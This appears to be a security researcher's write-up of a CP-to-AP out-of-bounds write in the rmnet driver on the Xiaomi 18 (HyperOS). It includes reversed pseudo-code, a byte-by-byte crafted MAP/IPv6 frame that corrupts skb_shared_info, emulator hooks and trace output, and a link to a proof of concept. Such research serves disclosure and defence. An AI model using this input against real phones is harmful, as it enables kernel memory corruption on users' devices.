---
title: "Xiaomi 18 HyperOS - CP to AP oob-write in rmnet"
published: 2026-11-10
tags: ["linux", "nasm", "pwn", "0day", "poc", "research", "baseband", "kernel"]
category: "research"
image: ./xiaomi18_hyperos/main.jpg
description: Write-up about an out-of-bounds write I found in the rmnet device shipped in the Xiaomi 18
---

Credit for the pic: [XilmO@夕末](https://www.pixiv.net/en/users/19389056).

While researching baseband security, I became interested in CP-to-AP vulnerabilities, an attack surface that appears under-researched. This post focuses on Qualcomm’s [RMNET](https://docs.kernel.org/networking/device_drivers/cellular/qualcomm/rmnet.html) driver.

> rmnet driver is used for supporting the Multiplexing and aggregation Protocol (MAP). This protocol is used by all recent chipsets using Qualcomm Technologies, Inc. modems.

> Multiplexing allows for creation of logical netdevices (rmnet devices) to handle multiple private data networks (PDN) like a default internet, tethering, multimedia messaging service (MMS) or IP media subsystem (IMS). Hardware sends packets with MAP headers to rmnet. Based on the multiplexer id, rmnet routes to the appropriate PDN after removing the MAP header.

RMNET parses MAP frames carried by skbs from the modem-facing network device before passing IP payloads to the Linux network stack. Several MAP frames can be aggregated into one skb, including the nonlinear skbs handled by this vendor driver.

# Introduction

The RMNET driver is open source, and you can find it in the Linux tree ([here](https://elixir.bootlin.com/linux/v7.3.1/source/drivers/net/ethernet/qualcomm/rmnet)). Phone vendors usually ship their own versions because of the chipsets they use (in our case, the `Qualcomm Snapdragon 8 Elite Gen 6`). Even though the drivers shipped on phones are not in-tree, their source code should be released under the GPL. That's why we can look at modified drivers, such as [this repository](https://github.com/zorn-trees/android_kernel_xiaomi_sm8650-modules/tree/lineage-23.2) for the `Qualcomm Snapdragon 8 Gen 3`. The only significant difference between that repository and the shipped modules is that we are running `OS4.0.27.0 HyperOS` rather than LineageOS.

I think this is a niche and interesting attack surface that is fairly easy to fuzz and audit. I was about to start with the open-source drivers, but I ended up looking at the compiled modules from the firmware instead. I wanted to try emulation-based fuzzing rather than rely only on syzkaller, which I usually use (and which is much faster). I downloaded build `OS4.0.27.0.XFRCNXM` from [MiFirm](https://mifirm.net/download/23246): `hxxps://bn.d.miui.com/OS4.0.27.0.XFRCNXM/hongkong_images_OS4.0.27.0.XFRCNXM_20261016.0000.00_17.0_cn_8714409356.tgz`.

# The attack surface

When looking for CP-to-AP vulnerabilities, the first step is to map the code paths in the target drivers that parse data delivered over DMA. I started with RMNET because it handles MAP, but SMEM, QRTR, and GLINK are other interesting interfaces.

The firmware apparently links the rmnet device to the IPA driver (pure deduction based on the compiled modules I identified). The receive flow from the dma looks like this:
`CP/AP DMA -> IPA RX path parses the DMA and issue a list of skb -> RMNET parses the skb`. So we end up in `rmnet_rx_handler` which will iter through the received skb containing MAP packets.

While reversing the module I ended up with this layout for `rmnet_map_header`.

```c
struct rmnet_map_header
{
  unsigned __int8 flags;
  unsigned __int8 mux_id;
  unsigned __int16 pkt_len;
};
```

For this post, I'll focus on MAP command frames. The command bit in the MAP header identifies the frame, while a separate command-name field selects the operation. The commands relevant here are:
```
FLOW_DISABLE (1): stop the virtual RMNET device's transmit queue
FLOW_ENABLE  (2): wake that transmit queue
FLOW_START   (7): mark the start of a downlink batch for RMNET
FLOW_END     (8): mark the end of that batch
```

## Port flags

Most of the features of the driver depend on the existing port flags the device has been initialized during the WDA negociation. The Network Interface Control Manager (NICM) will run after the boot startup a negociation with the WDA (the baseband) to know which kind of features and protocol versions he can handle and according to this negociation it will initilize the port flags of the rmnet device. From an attacker perspective if we need to trigger a code path which is not enabled by the current configuration we can still *force* a renegociation by specific QRTR packets through SMEM (which is not too difficult given we have control over the DMA). These are the possible outcomes of a nicm negociation I identified:
| Profile | Full flags | receive behavior |
| --- | ---: | --- |
| Default, everything accepted | `0xB4000071` | Fragmented path for nonlinear skb; otherwise MAP deaggregation with DL v5 |
| Default, DL aggregation rejected but UL accepted | `0xB4000070` | Fragmented path for nonlinear skb; otherwise direct MAP ingress |
| Default, UL/DL fallback to 5, aggregation accepted | `0xB4000001` | No fragmented-header path; MAP deaggregation without v4/v5 checksum |
| Target 58, requested DL aggregation accepted | `0x34000061` | Fragmented path with `0x20`; otherwise MAP deaggregation |

To reach `rmnet_frag_command`, the port needs `RMNET_FLAGS_INGRESS_MAP_COMMANDS` (`0x02`). The WDA parsing path in this NICM build does not set that bit. It can be enabled by AP-side RMNET link configuration when a virtual device is created or changed. On the fragmented path, the downlink marker handler runs first when its flags are set, so `0x02` alone does not guarantee that `rmnet_frag_command` is called.

## Prior IPA parsing

This is actually a tricky part which tricked me a lot because I was not used to this design in other baseband manufacturers. rmnet is not handling the DMA directly, it is receiving a skb from the IPA driver which is the one actually accessing the DMA, fortunately for us is does not perform a lot of sanity checks on the downlink (DL) map packets (the qmap packets sent from the baseband to the AP). That's why we can assume in the poc and in the fuzzer that the input from `rmnet_rx_handler` is mostly attacker controlled.

# The findings

After spending some time reversing and building the fuzzer with unicornafl I ultimately came to two different findings within the same function: `rmnet_frag_command` (callstack: `rmnet_rx_handler` => `rmnet_frag_ingress_handler` => `rmnet_frag_command`). Here is a pseudo-code of the function:

```c
void *rmnet_frag_command(struct rmnet_frag_descriptor *desc,
                         struct rmnet_map_header *hdr,
                         struct rmnet_port *port)
{
    struct rmnet_endpoint *ep;
    struct sk_buff *skb = NULL;
    struct net_device *dev;
    struct rmnet_map_header *hdr;
    u32 pkt_len;
    u8 cmd;

    // 1. Extract command header pointer
    hdr = rmnet_frag_header_ptr(desc, 4, 16, &hdr);
    if (!hdr)
        goto out;

    cmd = *(u8 *)hdr;

...

    // cmd == 1 is FLOW_DISABLE, cmd == 2 is FLOW_ENABLE
    if (rmnet_vnd_do_flow_control(ep->vnd, (cmd == 2) ? 1 : 0) != 0 && cmd == FLOW_DISABLE)
        goto out;

    result = (void *)_alloc_skb(
                       a1: (unsigned __int16)((__builtin_bswap32(hdr->pkt_len) >> 16) + 64),
                       a2: 2080,
                       a3: 0,
                       a4: 0xFFFFFFFFLL);
    if ( result != nullptr )
    {
        v9 = (void **)result;
        v10 = *((_DWORD *)result + 52) + 32;
        *((_QWORD *)result + 28) += 32LL;
        *((_DWORD *)result + 52) = v10;
        skb_put(a1: result, a2: __builtin_bswap32(hdr->pkt_len) >> 16);
        memcpy(dest: v9[28], src: hdr, n: __builtin_bswap32(hdr->pkt_len) >> 16);
        skb_push(a1: v9, a2: 4);

        // Mark packet as an outgoing MAP command ACK 
        u8 *flags = skb_mac_header(skb) + 5;
        *flags = (*flags & 0xFC) | 0x01;
    }

    // 4. forward the ack to the ipa driver
    netif_tx_lock(dev);
    if (dev->netdev_ops && dev->netdev_ops->ndo_start_xmit) {
        dev->netdev_ops->ndo_start_xmit(skb, dev);
    }
    netif_tx_unlock(dev);

    return skb;
}
```

This function processes flow control commands, and if successful, builds and sends back to the modem an ACK packet containing the original command payload.

In this threat model we assume the attacker can write arbitrary content into the DMA shared between the CP and the AP, it means here that we can control what is written over the `hdr` struct which is basically a `map_header`. 

If you are familiar with vulnerability research the two bug should be straightforward: 

- `(unsigned __int16)((__builtin_bswap32(hdr->pkt_len) >> 16) + 64` might wrap around because of the u16 cast which will cause an fully attacker-controlled out-of-bounds write... well, not exactly.

~~- The second bug is more specific to the threat model, because we are dealing with a DMA, the attacker might abuse the double fetch between `skb_put` / `_alloc_skb` and the `memcpy`, leading to an out-of-bounds write as well.~~ => doesn't work because IPA is not exposing the DMA directly, it is issuing already filled skbs. 

*Final Outcome*: Well, the primitive would be so neat if we could just reach the memcpy and corrupt the heap memory but unfortunately the `skb_put` will very likely crash because `old_tail + len >  end` which will cause a BUG() and a crash...

To trigger an actual out-of-bound write we need to find another path, that's why I started looking into the *coalescing* path in `_rmnet_map_ingress_handler`, especially `rmnet_map_process_next_hdr_packet`. The root-cause analysis is quite long so I will start from a given buggy input:
```
 offset          bytes (hex)          field / meaning
 ------          -----------          ----------------------------------------
 0x0000          40                   QMAP: next_hdr=1, cd_bit=0, pad_len=0
 0x0001          42                   mux_id=0x42
 0x0002          0E F0                QMAP pkt_len=3824 (frame size minus 4)

 0x0004          02                   MAPv5 header type=COALESCING
 0x0005          10                   num_nlos=1, csum_valid=0
 0x0006          00                   close_type=0 (avoids reuse shortcut)
 0x0007          00                   virtual_channel_id=0
 0x0008          0E C0                NLO pkt_len=3776
 0x000A          01                   checksum-error bit for packet 0
 0x000B          01                   num_packets=1
 0x000C..0x001F  00 x 20              remaining NLO entries

 0x0020          60 00 00 00          IPv6 version=6
 0x0024          0E AC                IPv6 payload_len=3756
 0x0026          00                   next header=Hop-by-Hop (not TCP)
 0x0027          40                   hop limit=64
 0x0028..0x0047  00 x 32              IPv6 source and destination addresses

 0x0048          3C FF                Hop-by-Hop: next=Destination Options,
                                      length=(255+1)*8=2048
 0x004A..0x0847  00 x 2046            Pad1 option bytes

 0x0848          06 D2                Destination Options: next=TCP,
                                      length=(210+1)*8=1688
 0x084A..0x0EDF  00 x 1686            Pad1 option bytes

 0x0EE0..0x0EF3  00 x 20              TCP bytes; doff at 0x0EEC is 00
 0x0EF4                               end of frame (3828 bytes total)
```

The code flow with this input in `rmnet_map_process_next_hdr_packet` and `__rmnet_map_segment_coal_skb` from will be:
```c
// rmnet_map_process_next_hdr_packet
coal = skb->data + 4;
if (coal->header_type != COALESCING || coal->num_nlos != 1)
    return -EINVAL;

skb_pull(skb, 4 + 28);                 // skb->data = frame offset 0x0020

ip_len = ipv6_skip_exthdr(skb, 40, ...);
// 40 + ((0xFF + 1) * 8) + ((0xD2 + 1) * 8) = 3776
// TCP is at frame offset 0x0020 + 3776 = 0x0EE0

tcp = skb->data + ip_len;
tcp_len = tcp->doff * 4;              // byte 0x0EEC = 0 -> tcp_len=0
seg_len = ntohs(coal->nl_pairs[0].pkt_len) - ip_len - tcp_len;
//        3776                              - 3776   - 0 = 0

// Extension headers disable GRO reuse; close_type=0 avoids the other shortcut.
__rmnet_map_segment_coal_skb(skb, ip_len, tcp_len, seg_len,
                             pkt_count=1, csum_valid=false);

// __rmnet_map_segment_coal_skb
dlen = pkt_count * seg_len;            // 0
hlen = ip_len + tcp_len;               // 3776
skbn = alloc_skb(hlen + dlen);         // 3776 data bytes; skb->end=3776

skb_reserve(skbn, hlen);               // data = head + 3776
skb_put(skbn, dlen);                   // put 0
skb_push(skbn, tcp_len);               // push 0
th = tcp_hdr(skbn);                    // th = skb_shared_info

th->seq = ...;                         // store at skb_shared_info + 4
check = &th->check;                    // points to skb_shared_info + 16

skb_push(skbn, ip_len);                // push IPv6 and extension headers
memcpy(skbn->data, ip, ip_len);
*check = pseudo_checksum;              // store at +16
*check = corrupted_checksum;           // second store at +16
```

The missing `doff >= 5` check in `rmnet_map_process_next_hdr_packet` and the zero segment length lets `__rmnet_map_segment_coal_skb` write TCP fields despite reserving zero TCP bytes which end up overwriting the `skb_shared_info` fields. In terms of flags requirements this code path requires `RMNET_FLAGS_INGRESS_COALESCE` or `RMNET_PRIV_FLAGS_INGRESS_MAP_CKSUMV5` and requires a linear skb (which is the default).

# What's up from the public available source?

From the LineageOS driver the `skb_put`, `memcpy` and `skb_push` is just.. missing:
```c
static void rmnet_frag_send_ack(struct rmnet_map_header *qmap,
				unsigned char type,
				struct rmnet_port *port)
{
	struct rmnet_map_control_command *cmd;
	struct net_device *dev = port->dev;
	struct sk_buff *skb;
	u16 alloc_len = ntohs(qmap->pkt_len) + sizeof(*qmap);

	skb = alloc_skb(alloc_len, GFP_ATOMIC);
	if (!skb)
		return;

	skb->protocol = htons(ETH_P_MAP);
	skb->dev = dev;

	cmd = rmnet_map_get_cmd_start(skb);
	cmd->cmd_type = type & 0x03;

	netif_tx_lock(dev);
	dev->netdev_ops->ndo_start_xmit(skb, dev);
	netif_tx_unlock(dev);
}
```

Because the skb contains the content of the map command packets already (parsed by the IPA driver) the driver don't need to copy the content of the map commands again, it can just write the command which gets aknowledged and that's it (but I am not sure yet if somone more experienced could clarify that).

For the `rmnet_map_process_next_hdr_packet` oob write the code is actually almost the same (a few functions are inlined in the .ko) so I bet this bug does not only affect HyperOS.

# Emulation

There is nothing special with the emulator, the extern kernel functions are emulated very simply, the indirect call to `ndo_start_xmit` is skipped and we trigger the double fetch when the memcpy is firing:
```py
def _code_hook(self, uc, address, size, _):
    self.insns += 1
    if self.insns > 500000:
        raise RuntimeError("instruction budget exceeded")

    if address == RETURN_ADDR:
        self.returned = True
        uc.emu_stop()
        return
    if address == 0xBA30:
        uc.reg_write(ac.UC_ARM64_REG_PC, address + 4) # xmit
        return
    if address == EXTERN["__stack_chk_fail"]:
        self._cb_stack_chk_fail()
        return
    if address == READ3_PKT_LEN:
        if self.mutate:
            self.uc.mem_write(DMA_BASE + QmapHeader.PKT_LEN_OFF,
                                QmapHeader.pkt_len_field(self.attack_len))
        return

    name = self._dispatch.get(address) # array containing all of the extern sym
    if name is None:
        return
    getattr(self, name)()
```

One limitation is that for the `rmnet_map_process_next_hdr_packet` case, `ipv6_skip_exthdr` is emulated in `_cb_ipv6_skip_exthdr`, i tried to vibe-code a rather realistic version, and the input tested in the poc passes it.

Otherwise every input is tested from the `rmnet_rx_handler`. So that should reliable enough *maybe*.

Which finally gives:

```
$ ./run.sh 
baseline
__alloc_skb(size=80, gfp=0x820, flags=0x0, node=-1)
skb_put(skb=0x80007000, len=16)
memcpy(dst=0x80008020, src=0xff0fffd000000004, n=16)
skb_push(skb=0x80007000, len=4)
consume_skb(skb=0x80005000)

pktlen-overflow
__alloc_skb(size=63, gfp=0x820, flags=0x0, node=-1)
skb_put(skb=0x80007000, len=65535)
memcpy(dst=0x80008020, src=0xff0fffd000000004, n=65535)
skb_push(skb=0x80007000, len=4)
consume_skb(skb=0x80005000)

coalesce-shinfo
__alloc_skb(size=3776, gfp=0x820, flags=0x0, node=-1)
skb_put(skb=0x80007000, len=0)
memcpy(dst=0x80008e80, src=0x80014ee0, n=0)
skb_push(skb=0x80007000, len=0)
memcpy(dst=0x80008ec0, src=0x80014ee0, n=0)
tcp_seq store @ 0x80008ec4 -> shinfo+0x4 (delta=4, width=4, value=0x0)
skb_push(skb=0x80007000, len=3776)
memcpy(dst=0x80008000, src=0x80014020, n=3776)
tcp_csum store @ 0x80008ed0 -> shinfo+0x10 (delta=16, width=2, value=0xffff)
tcp_csum store @ 0x80008ed0 -> shinfo+0x10 (delta=16, width=2, value=0x100)
OK: tcp_seq@+4 tcp_csum@+16 tcp_csum@+16 inside skb_shared_info; object kmalloc-4096, gso_size=0 gso_segs=0x0 hwtstamp.lo=0x100
```

Full code of the poc: [here](https://gist.github.com/n4sm/49468d9cfc2215b8d27b23c2fdda19f0).

# Conclusion

At first, I did not know that the vendors had to fully publish the source code, from now on I will definitly do some fuzzing and VR on other obscure chinese smartphones drivers. What was interesting with today's findings is that the Xiaomi 18 has just been released a few days ago so the timing for this research is cool enough. I hope you enjoyed this blogpost, if you have interesting VR projects plz contact me at: `kernelresearch[at]proton.me`.